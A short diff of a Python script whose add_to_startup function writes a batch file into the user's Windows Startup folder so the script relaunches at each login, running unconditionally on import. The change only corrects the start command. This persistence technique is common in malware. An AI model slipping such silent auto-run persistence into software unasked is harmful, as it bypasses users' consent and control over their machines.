@@ -59,7 +59,7 @@ USER_NAME = getpass.getuser()
 def add_to_startup():
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
-        bat_file.write("start " +  __file__ + "w")
+        bat_file.write("start " +  __file__)
 
 #WINDOWS ONLY
 add_to_startup()
